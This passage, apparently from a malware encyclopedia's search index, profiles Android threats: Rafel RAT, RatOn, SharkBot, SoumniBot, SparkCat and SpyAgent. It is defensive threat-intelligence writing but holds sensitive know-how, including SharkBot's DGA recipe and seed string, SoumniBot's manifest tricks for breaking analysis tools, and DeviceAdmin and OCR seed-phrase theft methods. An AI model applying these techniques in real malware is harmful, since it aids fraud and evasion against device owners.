note"},{"location":"malware/families/rafelrat/#ransomware-module","title":"Ransomware Module","text":"<p>The ransomware capability is particularly notable because mobile ransomware remains uncommon compared to desktop variants. Rafel RAT's ransomware module uses AES encryption with a pre-defined key to encrypt files on the device. If the malware has obtained DeviceAdmin privileges, it can also change the device lock screen password and display a custom ransom message on the lock screen.</p> <p>Check Point documented a campaign by an Iran-based operator who deployed the ransomware module with an Arabic-language ransom note delivered via SMS. The operator also changed the device wallpaper to a ransom demand and used a Telegram channel for victim communication. If the victim attempted to revoke DeviceAdmin privileges, the ransomware would react by immediately changing the password and locking the screen.</p>"},{"location":"malware/families/rafelrat/#espionage-operations","title":"Espionage Operations","text":"<p>When used by APT-C-35, Rafel RAT functions as an espionage platform. The combination of SMS theft, contact harvesting, location tracking, call log exfiltration, and notification interception provides comprehensive surveillance of the target's communications and movements. The ability to enumerate installed applications also enables operators to profile the target's device usage and identify additional collection opportunities.</p>"},{"location":"malware/families/rafelrat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/rafelrat/#c2-communication","title":"C2 Communication","text":"<p>Rafel RAT primarily uses HTTP(S) for command-and-control communication. The C2 infrastructure runs a PHP-based panel with JSON-based storage, providing operators a web interface for real-time monitoring and command issuance to compromised devices. As an alternative C2 channel, Rafel RAT also supports communication via Discord APIs, allowing operators to receive exfiltrated data and issue commands through Discord servers.</p> C2 Method Details HTTP(S) Primary communication channel to PHP-based panel Discord API Alternative channel using Discord servers for C2 PHP panel Web-based management interface with JSON storage"},{"location":"malware/families/rafelrat/#deviceadmin-abuse","title":"DeviceAdmin Abuse","text":"<p>Rafel RAT requests DeviceAdmin privileges during installation, which if granted provide elevated control over the device. With DeviceAdmin access, the malware can change the lock screen password, lock the device remotely, and resist uninstallation by preventing the victim from revoking admin privileges. This is particularly critical for the ransomware module, which uses DeviceAdmin to enforce the lock screen ransom note and prevent the victim from regaining device access without paying.</p>"},{"location":"malware/families/rafelrat/#persistence","title":"Persistence","text":"<p>The malware uses social engineering at install time to obtain broad permissions, and DeviceAdmin enrollment makes removal difficult without factory reset. On outdated Android versions (which represent over 87% of victims), the permission model provides fewer safeguards against granting these privileges.</p>"},{"location":"malware/families/rafelrat/#target-regions","title":"Target Regions","text":"Region Details United States Most targeted country China Second most targeted Indonesia Third most targeted France, Germany, Italy European targets India, Pakistan South Asian targets, overlapping with APT-C-35 operations Russia, Australia Additional targeted countries <p>Check Point noted that some campaigns successfully targeted high-profile organizations in government and military sectors, though the majority of victims appear to be individuals running outdated Android devices.</p>"},{"location":"malware/families/rafelrat/#notable-campaigns","title":"Notable Campaigns","text":"<p>APT-C-35 espionage operations: Check Point identified campaigns attributed to APT-C-35 (DoNot Team), a South Asian espionage group, using Rafel RAT for intelligence collection. DoNot Team's adoption of an open-source tool alongside their custom malware demonstrates how freely available RATs reduce the barrier for even sophisticated actors.</p> <p>Iran-based ransomware campaign: An operator based in Iran deployed Rafel RAT's ransomware module with an Arabic-language ransom note delivered via SMS. The campaign changed victim device wallpapers to ransom demands and used Telegram as a communication channel for extortion, representing one of the more brazen uses of mobile ransomware in the wild.</p> <p>June 2024 disclosure: Check Point Research publishes comprehensive analysis documenting approximately 120 campaigns, around 120 C2 servers, and samples spanning multiple countries and threat actor profiles. The report highlights the convergence of espionage and ransomware operations within a single open-source tool.</p>"},{"location":"malware/families/rafelrat/#related-families","title":"Related Families","text":"<p>Rafel RAT's open-source, multi-operator model contrasts with the Malware-as-a-Service (MaaS) approach used by families like Hook, Octo, and Cerberus, where access is sold through underground forums. The MaaS families typically provide more polished infrastructure and support, while Rafel RAT's free availability means operators must stand up their own C2 panels and customize the malware independently.</p> <p>The ransomware capability sets Rafel RAT apart from most Android banking trojans. While families like Brata include destructive device wipe features as anti-forensics measures, Rafel RAT's ransomware module is designed for extortion with file encryption, ransom notes, and lock screen manipulation.</p> <p>As an espionage tool used by APT-C-35, Rafel RAT operates in the same category as SpyNote, another Android RAT frequently used by threat actors for surveillance operations. Both provide comprehensive device monitoring capabilities, though SpyNote is typically deployed in more targeted operations while Rafel RAT's open-source nature has enabled broader, less discriminate campaigns.</p>"},{"location":"malware/families/raton/","title":"RatOn","text":"<p>RatOn is an Android banking trojan that combines NFC relay attacks with ATS (Automated Transfer System) capabilities, making it the first known family to merge these two fraud techniques into a single platform. Discovered by ThreatFabric in September 2025, the malware evolved from a basic NFC relay tool into a sophisticated RAT with crypto wallet seed phrase extraction. It initially targets Czech Republic banking customers and has expanded into Slovakia, building on the NFC relay research first demonstrated by ESET's analysis of NGate.</p>"},{"location":"malware/families/raton/#overview","title":"Overview","text":"Attribute Details First Seen July 5, 2025 Status Active Type Banking trojan, NFC relay, ATS, RAT Attribution Unknown Distribution Fake TikTok 18+ Play Store pages"},{"location":"malware/families/raton/#origin-and-lineage","title":"Origin and Lineage","text":"<p>RatOn's development trajectory shows a clear evolution from a simple NFC relay tool to a multi-capability banking trojan. ThreatFabric's analysis documents this progression:</p> <p>The NFC relay technique at RatOn's core builds on research first published by ESET regarding NGate, a family that demonstrated the viability of relaying NFC payment card data from a victim's device to a mule operating at a physical POS terminal or ATM. RatOn took this concept and expanded it significantly by adding remote access, ATS for automated money transfers, and cryptocurrency wallet targeting.</p> <p>The evolution from a focused NFC relay tool to a full-featured RAT with ATS suggests active development by operators who recognized the limitations of a single-vector approach and systematically added complementary fraud capabilities.</p>"},{"location":"malware/families/raton/#distribution","title":"Distribution","text":"Vector Details Fake TikTok pages Fraudulent \"TikTok 18+\" pages mimicking Google Play Store listings Social engineering Lures designed to appeal to users seeking age-restricted content <p>ThreatFabric documented that RatOn is distributed through fake Play Store pages advertising a \"TikTok 18+\" application. The adult content lure is designed to override user caution about sideloading apps from outside the official store.</p>"},{"location":"malware/families/raton/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/raton/#core-features","title":"Core Features","text":"Capability Implementation NFC relay Clones payment card data from victim's device and relays it to mules at physical POS terminals ATS Automated money transfers targeting Czech banking app George Cesko Crypto wallet theft Seed phrase extraction via Accessibility Service from MetaMask, Trust Wallet, Blockchain.com, Phantom Remote access Full device control for manual fraud operations Accessibility abuse Used for both crypto seed extraction and ATS automation"},{"location":"malware/families/raton/#nfc-relay","title":"NFC Relay","text":"<p>The NFC relay capability is RatOn's foundational feature. The attack chain works as follows:</p> <ol> <li>The victim is socially engineered into placing their payment card against their NFC-enabled phone</li> <li>RatOn reads the NFC data from the payment card</li> <li>The captured card data is relayed in real-time to a mule's device</li> <li>The mule uses the relayed data at a physical POS terminal or ATM to make transactions or withdraw cash</li> </ol> <p>This attack turns the victim's device into a bridge between their physical payment card and a remote attacker. The technique was first documented in the wild with the NGate family, but RatOn is the first to combine it with additional fraud mechanisms.</p>"},{"location":"malware/families/raton/#automated-transfer-system-ats","title":"Automated Transfer System (ATS)","text":"<p>ThreatFabric confirmed that RatOn is the first family to combine NFC relay with ATS. The ATS component specifically targets George Cesko, the mobile banking application of Ceska sporitelna (Czech Savings Bank). ATS automates the process of initiating and confirming money transfers within the banking app without the victim's awareness, using the Accessibility Service to navigate the app, fill in transfer details, and approve transactions.</p>"},{"location":"malware/families/raton/#cryptocurrency-wallet-targeting","title":"Cryptocurrency Wallet Targeting","text":"<p>RatOn extracts seed phrases from cryptocurrency wallet applications through Accessibility Service monitoring:</p> Wallet Targeted Data MetaMask Seed phrase / recovery phrase Trust Wallet Seed phrase / recovery phrase Blockchain.com Seed phrase / recovery phrase Phantom Seed phrase / recovery phrase <p>The Accessibility Service monitors when a user navigates to seed phrase display screens within these wallet apps and captures the displayed text. This gives operators access to the victim's cryptocurrency holdings across any blockchain supported by the compromised wallet.</p>"},{"location":"malware/families/raton/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/raton/#multi-vector-fraud-architecture","title":"Multi-Vector Fraud Architecture","text":"<p>RatOn's significance lies in its combination of three distinct fraud techniques in a single package:</p> <ol> <li>NFC relay for physical card fraud at POS terminals and ATMs</li> <li>ATS for automated bank transfers through the victim's own banking app</li> <li>Crypto theft through seed phrase extraction for cryptocurrency wallet drainage</li> </ol> <p>This multi-vector approach gives operators flexibility to monetize compromised devices through whichever channel offers the highest return, whether that is cloning payment cards, automating bank transfers, or stealing cryptocurrency.</p>"},{"location":"malware/families/raton/#c2-communication","title":"C2 Communication","text":"<p>Specific C2 protocol details were not fully disclosed in ThreatFabric's initial publication. The C2 infrastructure supports real-time NFC data relay, which requires low-latency communication between the victim's device and the mule's device.</p>"},{"location":"malware/families/raton/#target-regions","title":"Target Regions","text":"Region Status Details Czech Republic Primary target Initial campaign, George Cesko banking app targeted Slovakia Expanding Secondary target region <p>ThreatFabric's report documents the Czech Republic as the initial target with expansion into Slovakia. The focus on George Cesko (the Czech Savings Bank app) for ATS confirms the geographic specificity of the current campaign.</p>"},{"location":"malware/families/raton/#notable-campaigns","title":"Notable Campaigns","text":"<p>July 2025: First RatOn samples observed in the wild, initially functioning as a basic NFC relay tool. Distribution begins through fake TikTok 18+ Play Store pages targeting Czech users.</p> <p>September 2025: ThreatFabric publishes their analysis, documenting RatOn's evolution from a simple NFC relay tool into a comprehensive RAT combining NFC relay, ATS targeting George Cesko, and crypto wallet seed phrase extraction. The family is confirmed as the first to combine NFC relay with ATS capabilities.</p>"},{"location":"malware/families/raton/#related-families","title":"Related Families","text":"<p>RatOn builds on the NFC relay concept pioneered by NGate, which ESET documented as the first Android malware performing NFC relay attacks in the wild. While NGate demonstrated the viability of the technique, RatOn represents its maturation by combining it with established banking trojan capabilities.</p> <p>Other families with ATS capabilities include Anatsa, which pioneered ATS fraud through Google Play distribution, and SharkBot, which combines ATS with DGA-based C2. The crypto wallet targeting overlaps with families like SparkCat and SpyAgent, though RatOn uses Accessibility Service monitoring rather than OCR for seed phrase capture.</p> <p>The combination of physical-world fraud (NFC relay at POS terminals) with digital fraud (ATS bank transfers and crypto theft) represents a convergence trend in mobile malware, where operators seek to maximize monetization by exploiting every available channel on a compromised device.</p>"},{"location":"malware/families/sharkbot/","title":"SharkBot","text":"<p>SharkBot is an Android banking trojan combining ATS (Automated Transfer System) fraud with a Domain Generation Algorithm (DGA) for C2 resilience. Discovered in October 2021, it was built from scratch with no code overlap with existing families. Its on-device fraud capabilities, cookie-stealing mechanism, and persistent Google Play presence made it a significant player in the EU banking trojan landscape. The DGA implementation, unusual for Android malware at the time, set it apart from contemporaries.</p>"},{"location":"malware/families/sharkbot/#overview","title":"Overview","text":"Attribute Details First Seen October 2021 Status Active (2025, v1.63+) Type Banking trojan, ATS fraud Aliases None widely used Attribution Unknown, financially motivated Distribution Google Play Store droppers, direct download"},{"location":"malware/families/sharkbot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cleafy's Threat Intelligence team identified SharkBot at the end of October 2021 during monitoring of European banking fraud. Analysis confirmed it shared no codebase with Anatsa/TeaBot, Cerberus/Alien, Oscorp, FluBot, or any other known Android banking family.</p> <p>NCC Group and Fox-IT published joint analysis in March 2022, providing the first deep technical breakdown including DGA internals and C2 protocol details. Fox-IT's blog covered the same analysis with additional distribution context.</p> <p>The malware has been under continuous development, with major version bumps in 2022 (v2, new DGA) and 2025 (v1.63, improved stealth).</p>"},{"location":"malware/families/sharkbot/#distribution","title":"Distribution","text":"<p>SharkBot's operators use Google Play dropper apps disguised as antivirus tools, file managers, and cleaner utilities.</p> Date Dropper Disguise Installs Source Early 2022 Antivirus apps 15,000+ NCC Group/Fox-IT April 2022 Various utility apps (7 apps) Thousands The Hacker News September 2022 Antivirus, cleaner apps Thousands Fox-IT November 2022 File manager apps Thousands The Hacker News <p>The dropper approach evolved over time. Early versions required <code>REQUEST_INSTALL_PACKAGES</code> and used accessibility services to install the payload. Later versions adopted a direct-download approach: the dropper opens a fake Play Store page prompting the user to \"update\" the app, which is actually the SharkBot payload. This avoided the need for accessibility permissions at the dropper stage.</p>"},{"location":"malware/families/sharkbot/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/sharkbot/#version-evolution","title":"Version Evolution","text":"Version Date Key Changes v1.x Oct 2021 ATS, overlay injection, SMS interception, keylogging, DGA (Base64) v2.x May 2022 Code refactor, new DGA (MD5), updated C2 protocol v2.25 Aug 2022 Cookie stealing added, auto-reply SMS removed v1.63 Feb 2025 Improved stealth and evasion"},{"location":"malware/families/sharkbot/#core-features","title":"Core Features","text":"Capability Implementation ATS fraud Accessibility service simulates touches/clicks to perform transfers Overlay injection WebView-based phishing triggered when target banking app opens Keylogging Accessibility event monitoring captures all text input SMS interception Reads and hides incoming SMS for 2FA bypass Cookie stealing Snatches session cookies during bank login via <code>logsCookie</code> command Push notification abuse Can auto-reply to push notifications DGA Fallback C2 resolution when hardcoded domains are taken down"},{"location":"malware/families/sharkbot/#cookie-stealing","title":"Cookie Stealing","text":"<p>Fox-IT documented the cookie-stealing feature introduced in v2.25 (August 2022). When the victim logs into their bank account, SharkBot intercepts the valid session cookie using the <code>logsCookie</code> command and exfiltrates it to C2. These cookies are valuable for account takeover because they contain session tokens and device fingerprinting parameters that bypass anti-fraud checks on subsequent logins.</p>"},{"location":"malware/families/sharkbot/#ats-implementation","title":"ATS Implementation","text":"<p>The ATS engine receives a list of events from C2 to simulate on the device in sequence. These events include:</p> <ul> <li>Touch/click simulation at specific coordinates</li> <li>Button press simulation</li> <li>Text input into fields</li> <li>App navigation steps</li> </ul> <p>This allows the operator to script full transfer workflows that execute autonomously on the victim's device.</p>"},{"location":"malware/families/sharkbot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sharkbot/#dga-algorithm","title":"DGA Algorithm","text":"<p>SharkBot's DGA is its most distinctive technical feature. Detailed analysis of both DGA versions documents the evolution:</p> <p>Version 1 (Base64 DGA):</p> <ul> <li>Input: <code>{week_of_year}{year}{seed_string}</code></li> <li>Seed string: <code>pojBI9LHGFdfgegjjsJ99hvVGHVOjhksdf</code></li> <li>Encoding: Base64</li> <li>Output: first 19 characters of the encoded string</li> <li>TLD: appended from hardcoded list</li> </ul> <p>Version 2 (MD5 DGA):</p> <ul> <li>Input: same date/seed combination</li> <li>Encoding: MD5 hash</li> <li>Output: first 19 characters of the hex digest</li> <li>Improvement: eliminates the static Base64 suffix that made v1 domains predictable</li> </ul> <p>The DGA regenerates weekly, producing new domains that the operators pre-register.</p>"},{"location":"malware/families/sharkbot/#c2-communication","title":"C2 Communication","text":"Component Details Encryption RC4 with hardcoded key Encoding Base64 over encrypted payload Protocol HTTPS POST Fallback DGA-generated domains when primary C2 is down"},{"location":"malware/families/sharkbot/#anti-analysis","title":"Anti-Analysis","text":"Technique Details String obfuscation Custom routine across all versions Emulator detection Checks build properties and hardware identifiers DGA Makes C2 takedown difficult Low AV detection Minimal static signatures at time of discovery"},{"location":"malware/families/sharkbot/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"Period Targeted Countries Oct-Dec 2021 UK, Italy, US Early 2022 UK, Italy Aug 2022 Expanded to Spain, Australia, Poland, Germany, US, Austria <p>Fox-IT observed the target expansion in August 2022 when new C2 servers began serving target lists including banks beyond the original UK/Italy focus. Targeted institutions include traditional banks and cryptocurrency exchanges.</p>"},{"location":"malware/families/sharkbot/#notable-campaigns","title":"Notable Campaigns","text":"<p>October-November 2021: Cleafy's initial disclosure documented the first SharkBot botnet targeting UK, Italian, and US banking apps and cryptocurrency exchanges.</p> <p>March 2022: NCC Group and Fox-IT published detailed analysis of SharkBot distributed through Google Play as fake antivirus apps, with 15,000+ installs across the UK and Italy.</p> <p>April 2022: SharkBot resurfaced on Google Play behind seven new apps after the initial batch was removed.</p> <p>September 2022: Fox-IT documented SharkBot v2.25 with the new cookie-stealing capability and MD5-based DGA, distributed through fake antivirus and cleaner apps.</p> <p>November 2022: SharkBot appeared in file manager apps on Google Play, targeting users primarily in the UK, Italy, and expanded European markets.</p> <p>February 2025: Cyble documented SharkBot v1.63 with improved stealth capabilities, confirming the malware remains under active development.</p>"},{"location":"malware/families/soumnibot/","title":"SoumniBot","text":"<p>SoumniBot is a Korean banking trojan that exploits weaknesses in Android's manifest parsing to evade static analysis tools. Kaspersky published the analysis in April 2024, documenting three novel manifest obfuscation techniques that exploit differences between how build tools validate the AndroidManifest.xml and how the Android OS actually parses it. The malware steals SMS messages, contacts, banking certificates (NPKI), and photos from South Korean banking users.</p>"},{"location":"malware/families/soumnibot/#overview","title":"Overview","text":"Attribute Details First Seen 2024 Last Seen Active Status Active Type Banking trojan, credential stealer Attribution Unknown; targets South Korea exclusively Aliases None known"},{"location":"malware/families/soumnibot/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.SoumniBot AhnLab Trojan/Android.Banker.SoumniBot McAfee Android/Banker.SoumniBot"},{"location":"malware/families/soumnibot/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SoumniBot is independently developed with no known code lineage to other banking trojan families. Its significance lies not in its operational capabilities (which are standard for Korean banking trojans) but in its manifest obfuscation techniques, which represent a novel evasion category affecting static analysis tools including jadx, apktool, and the Android system's own manifest parser.</p> <p>The family operates in the same Korean banking threat space as Fakecalls and SpyAgent.</p>"},{"location":"malware/families/soumnibot/#distribution","title":"Distribution","text":"Vector Details Smishing SMS messages impersonating Korean banking services Fake banking apps APKs disguised as legitimate Korean banking applications Third-party stores Distribution through Korean third-party app repositories"},{"location":"malware/families/soumnibot/#capabilities","title":"Capabilities","text":"Capability Description SMS interception Reads and forwards SMS including banking OTPs Contact theft Exfiltrates full contact list NPKI certificate theft Steals Korean banking authentication certificates (NPKI digital certificates stored on device) Photo exfiltration Uploads photos from device storage Device info collection IMEI, phone number, operator, installed apps Manifest obfuscation Three novel techniques to evade static analysis"},{"location":"malware/families/soumnibot/#npki-certificate-theft","title":"NPKI Certificate Theft","text":"<p>South Korean banking relies heavily on NPKI (National Public Key Infrastructure) digital certificates stored locally on devices for transaction authentication. SoumniBot specifically targets these certificate files, which are typically stored in the device's <code>/NPKI/</code> directory. Stolen NPKI certificates combined with captured credentials enable unauthorized banking transactions.</p>"},{"location":"malware/families/soumnibot/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/soumnibot/#manifest-obfuscation","title":"Manifest Obfuscation","text":"<p>The core technical innovation documented by Kaspersky:</p>"},{"location":"malware/families/soumnibot/#technique-1-invalid-compression-method","title":"Technique 1: Invalid Compression Method","text":"<p>The AndroidManifest.xml inside the APK (ZIP) uses an invalid compression method value in the ZIP entry header. Android's libziparchive defaults to uncompressed extraction when encountering an unknown method, but analysis tools that strictly validate compression methods fail to parse the manifest.</p>"},{"location":"malware/families/soumnibot/#technique-2-invalid-manifest-size","title":"Technique 2: Invalid Manifest Size","text":"<p>The manifest's declared size in the ZIP entry header does not match its actual size. Android's parser reads the file normally regardless, but tools that validate size consistency either crash or produce corrupt output.</p>"},{"location":"malware/families/soumnibot/#technique-3-long-namespace-names","title":"Technique 3: Long Namespace Names","text":"<p>XML namespace strings of excessive length (hundreds of thousands of characters) are inserted into the manifest. This causes analysis tools to allocate excessive memory when rendering the manifest, often leading to crashes or timeouts. Android's parser handles the long strings without issue.</p>"},{"location":"malware/families/soumnibot/#impact-on-analysis-tools","title":"Impact on Analysis Tools","text":"Tool Effect jadx Fails to parse manifest with invalid compression apktool Errors on size mismatch, produces incomplete output AAPT/AAPT2 Handles some techniques but struggles with long namespaces Android OS Parses all three techniques correctly, installs and runs the app <p>These techniques specifically target the gap between how analysis tools and the Android OS parse the same file. The malware is fully functional on devices but breaks standard reverse engineering workflows.</p>"},{"location":"malware/families/soumnibot/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based C2</li> <li>Dynamic C2 server addresses retrieved from configuration</li> <li>Exfiltrated data (SMS, certificates, photos) uploaded via multipart HTTP POST</li> <li>Commands received via JSON polling</li> </ul>"},{"location":"malware/families/soumnibot/#target-regions","title":"Target Regions","text":"Region Details South Korea Exclusive target, Korean banking focus <p>SoumniBot targets major South Korean banks and financial institutions. The NPKI certificate theft specifically targets the Korean digital certificate infrastructure, which has no direct equivalent in other countries.</p>"},{"location":"malware/families/soumnibot/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, April: Kaspersky publishes SoumniBot analysis, documenting three novel manifest obfuscation techniques. Google is notified about the parser exploitation techniques. The research directly impacts the static analysis community by highlighting that standard tools may fail to parse deliberately malformed manifests.</p>"},{"location":"malware/families/sparkcat/","title":"SparkCat","text":"<p>SparkCat is the first documented malware family to use OCR (optical character recognition) to steal cryptocurrency wallet recovery phrases from device photos, and the first OCR-based stealer to infiltrate both Google Play and Apple's App Store. Kaspersky discovered SparkCat in February 2025, finding it active since at least March 2024 with 242,000+ downloads across both platforms. The malware uses Google ML Kit to scan gallery images for screenshots of cryptocurrency wallet seed phrases, then exfiltrates matching images to C2 servers using a Rust-based communication protocol. A follow-up variant, SparkKitty, was identified in mid-2025 targeting Southeast Asian and Chinese users through fake gambling and TikTok clone apps.</p>"},{"location":"malware/families/sparkcat/#overview","title":"Overview","text":"Attribute Details First Seen March 2024 Last Seen Active (SparkKitty variant, 2025) Status Active, new variants emerging Type Cryptocurrency stealer, OCR-based data exfiltration Attribution Unknown; C2 comments suggest Chinese-speaking developer Aliases SparkKitty (later variant)"},{"location":"malware/families/sparkcat/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan.AndroidOS.SparkCat McAfee Android/SparkCat ESET Android/Spy.SparkCat"},{"location":"malware/families/sparkcat/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SparkCat is independently developed with no known code lineage to existing malware families. However, the OCR-based crypto theft technique has a parallel: McAfee documented the SpyAgent campaign in September 2024, which independently uses OCR to steal crypto seed phrases from device photos targeting Korean users. The two operations appear to be separate actors converging on the same technique, indicating OCR-based credential theft is an emerging threat pattern.</p> <p>SparkCat is cross-platform, operating on both Android and iOS. This is unusual for mobile malware families, which typically target a single platform.</p>"},{"location":"malware/families/sparkcat/#distribution","title":"Distribution","text":""},{"location":"malware/families/sparkcat/#google-play-and-app-store","title":"Google Play and App Store","text":"<p>SparkCat achieved presence on both major app stores simultaneously:</p> Platform App Types Downloads Google Play Food delivery, AI assistants, messaging apps 242,000+ combined Apple App Store Similar utility categories Unknown count <p>Some carrier apps appear to be legitimate applications compromised with a malicious SDK (supply chain attack), while others were purpose-built by the threat actor.</p>"},{"location":"malware/families/sparkcat/#sparkkitty-variant-2025","title":"SparkKitty Variant (2025)","text":"<p>Kaspersky documented the SparkKitty follow-up:</p> Distribution Details Fake gambling apps Targets Southeast Asian users TikTok clones Social media impersonation Social engineering Waits for user to open support chat, requests gallery access for \"screenshots\" <p>The SparkKitty variant uses a more targeted social engineering approach: it waits for the user to open an in-app support chat, then requests gallery access under the pretense of attaching screenshots. This provides a legitimate-seeming context for the gallery permission request.</p>"},{"location":"malware/families/sparkcat/#capabilities","title":"Capabilities","text":"Capability Description OCR scanning Uses Google ML Kit to scan gallery images for crypto seed phrases Multi-language OCR Recognizes seed phrases in English, Chinese, Japanese, Korean, and European languages Selective exfiltration Only uploads images containing detected seed phrase patterns Gallery monitoring Monitors photo gallery for new screenshots C2 communication Rust-based protocol for command and data transfer Cross-platform Operates on both Android and iOS"},{"location":"malware/families/sparkcat/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/sparkcat/#ocr-pipeline","title":"OCR Pipeline","text":"<p>The core theft mechanism uses Google ML Kit's on-device text recognition:</p> <ol> <li>Malware requests gallery/photo access (using social engineering context or at installation)</li> <li>Scans all images in the device gallery using ML Kit OCR</li> <li>Applies keyword matching against a dictionary of seed phrase-related terms (BIP-39 wordlist patterns, \"recovery phrase,\" \"seed words,\" etc.)</li> <li>Images matching crypto wallet seed phrase patterns are uploaded to C2</li> <li>Monitoring continues for new images added to gallery</li> </ol> <p>The use of on-device ML Kit means OCR processing happens locally without sending all images to a remote server, reducing network footprint and making detection harder.</p>"},{"location":"malware/families/sparkcat/#rust-based-c2","title":"Rust-Based C2","text":"<p>SparkCat's C2 communication uses a custom protocol implemented in Rust, an unusual choice for Android malware:</p> <ul> <li>Binary protocol over HTTPS</li> <li>Rust native library handles serialization and encryption</li> <li>Complicates reverse engineering compared to standard Java/Kotlin HTTP clients</li> <li>C2 server infrastructure observed with Chinese-language comments in configuration</li> </ul>"},{"location":"malware/families/sparkcat/#keyword-matching","title":"Keyword Matching","text":"<p>The OCR results are matched against localized keyword dictionaries:</p> Language Target Keywords English \"recovery phrase,\" \"seed phrase,\" \"mnemonic,\" BIP-39 words Chinese Simplified and traditional crypto wallet terminology Japanese Japanese translations of wallet recovery terms Korean Korean crypto exchange terminology"},{"location":"malware/families/sparkcat/#target-regions","title":"Target Regions","text":"Region Vector Southeast Asia Primary target, SparkKitty gambling app lures China Chinese-language OCR, TikTok clone apps Global Play Store/App Store distribution reaches worldwide"},{"location":"malware/families/sparkcat/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, March: SparkCat begins operating on Google Play and Apple App Store. Multiple apps with combined 242,000+ downloads carry the malicious SDK.</p> <p>2025, February: Kaspersky publishes SparkCat analysis, documenting the first OCR-based stealer on both major app stores. The research reveals Google ML Kit integration, Rust-based C2, and multi-language seed phrase detection.</p> <p>2025: SparkKitty variant emerges targeting Southeast Asian users through fake gambling games and TikTok clones. The variant refines social engineering by requesting gallery access during in-app support chat interactions.</p>"},{"location":"malware/families/spyagent/","title":"SpyAgent","text":"<p>SpyAgent is an Android spyware campaign using OCR (optical character recognition) to steal cryptocurrency wallet recovery phrases from device photos. McAfee discovered the campaign in September 2024, identifying 280+ fake apps targeting Korean users since January 2024. The apps impersonate banking, government, streaming, and utility applications to gain gallery access, then scan stored photos for screenshots containing cryptocurrency mnemonic seed phrases. McAfee's investigation also revealed misconfigured attacker infrastructure, exposing admin panels, stolen data, and operational details.</p>"},{"location":"malware/families/spyagent/#overview","title":"Overview","text":"Attribute Details First Seen January 2024 Last Seen Active Status Active, expanding Type Cryptocurrency stealer, spyware Attribution Unknown; infrastructure suggests organized operation Aliases None known"},{"location":"malware/families/spyagent/#vendor-names","title":"Vendor Names","text":"Vendor Name McAfee Android/SpyAgent Kaspersky HEUR:Trojan-Spy.AndroidOS.SpyAgent AhnLab Trojan/Android.SpyAgent"},{"location":"malware/families/spyagent/#origin-and-lineage","title":"Origin and Lineage","text":"<p>SpyAgent is independently developed. The OCR-based crypto theft technique is shared with SparkCat, which Kaspersky documented targeting a broader audience via Google Play and App Store. The two operations appear to be separate actors who independently converged on the same attack technique. SpyAgent focuses narrowly on Korean users through sideloaded apps, while SparkCat uses supply chain distribution via official stores.</p>"},{"location":"malware/families/spyagent/#distribution","title":"Distribution","text":"<p>SpyAgent distributes through phishing SMS and social media, directing users to fake download pages:</p> Vector Details Smishing SMS with links to fake app download pages Social media Phishing links on Korean social platforms Fake websites Landing pages impersonating legitimate services"},{"location":"malware/families/spyagent/#app-impersonation","title":"App Impersonation","text":"<p>280+ fake apps identified, impersonating:</p> Category Examples Banking Korean bank apps, financial calculators Government Korean government service apps Streaming Media and entertainment apps Utilities Photo editors, storage managers, delivery tracking <p>All apps are distributed through sideloading (APK download from fake websites), not through Google Play.</p>"},{"location":"malware/families/spyagent/#capabilities","title":"Capabilities","text":"Capability Description OCR scanning Scans device gallery photos for crypto seed phrases Photo exfiltration Uploads photos containing detected seed phrases SMS interception Reads and forwards SMS including OTPs Contact theft Exfiltrates contact list Device info Hardware identifiers, installed apps Gallery monitoring Watches for new screenshots added to gallery"},{"location":"malware/families/spyagent/#ocr-crypto-theft","title":"OCR Crypto Theft","text":"<p>The core theft mechanism:</p> <ol> <li>App requests storage/media permissions during installation</li> <li>Scans all images in device gallery using on-device OCR</li> <li>Applies pattern matching against BIP-39 seed phrase word patterns</li> <li>Images matching seed phrase patterns are uploaded to C2</li> <li>Continues monitoring gallery for new screenshots</li> </ol> <p>Users commonly screenshot their wallet recovery phrases during initial crypto wallet setup. SpyAgent targets these screenshots to extract the 12-24 word recovery phrases that provide full access to cryptocurrency wallets.</p>"},{"location":"malware/families/spyagent/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/spyagent/#ocr-implementation","title":"OCR Implementation","text":"<p>SpyAgent uses on-device text recognition to process gallery images:</p> <ul> <li>Processes images locally on the device</li> <li>Keyword matching against common seed phrase patterns and BIP-39 wordlist</li> <li>Selective upload (only matching images, not entire gallery)</li> <li>Multiple OCR passes for different image orientations and text sizes</li> </ul>"},{"location":"malware/families/spyagent/#exposed-infrastructure","title":"Exposed Infrastructure","text":"<p>McAfee discovered misconfigured attacker servers with exposed admin panels revealing:</p> Exposed Data Details Admin panels Web interfaces for managing stolen data Victim databases Stolen SMS, contacts, and photos from compromised devices Configuration files Server-side logic for processing OCR results Statistics Infection counts and data collection metrics <p>The exposed infrastructure provided unusual visibility into the operation's scale and methodology. The admin panels showed organized data management, suggesting a structured criminal operation rather than opportunistic individual actors.</p>"},{"location":"malware/families/spyagent/#c2-communication","title":"C2 Communication","text":"<ul> <li>HTTP-based communication</li> <li>Stolen data uploaded via multipart POST requests</li> <li>Server-side processing of uploaded images with additional OCR verification</li> <li>Simple command structure for app configuration and data exfiltration parameters</li> </ul>"},{"location":"malware/families/spyagent/#target-regions","title":"Target Regions","text":"Region Details South Korea Primary and near-exclusive target <p>The campaign targets Korean cryptocurrency holders specifically. All fake apps use Korean language, impersonate Korean services, and are distributed through Korean-language phishing channels.</p>"},{"location":"malware/families/spyagent/#notable-campaigns","title":"Notable Campaigns","text":"<p>2024, January: SpyAgent campaign begins deploying fake apps targeting Korean users. 280+ unique app variants identified over the campaign's lifetime.</p> <p>2024, September: McAfee publishes SpyAgent analysis, documenting the OCR-based seed phrase theft, 280+ fake apps, and exposed attacker infrastructure. The research reveals the operational scale and confirms crypto wallet theft as the primary 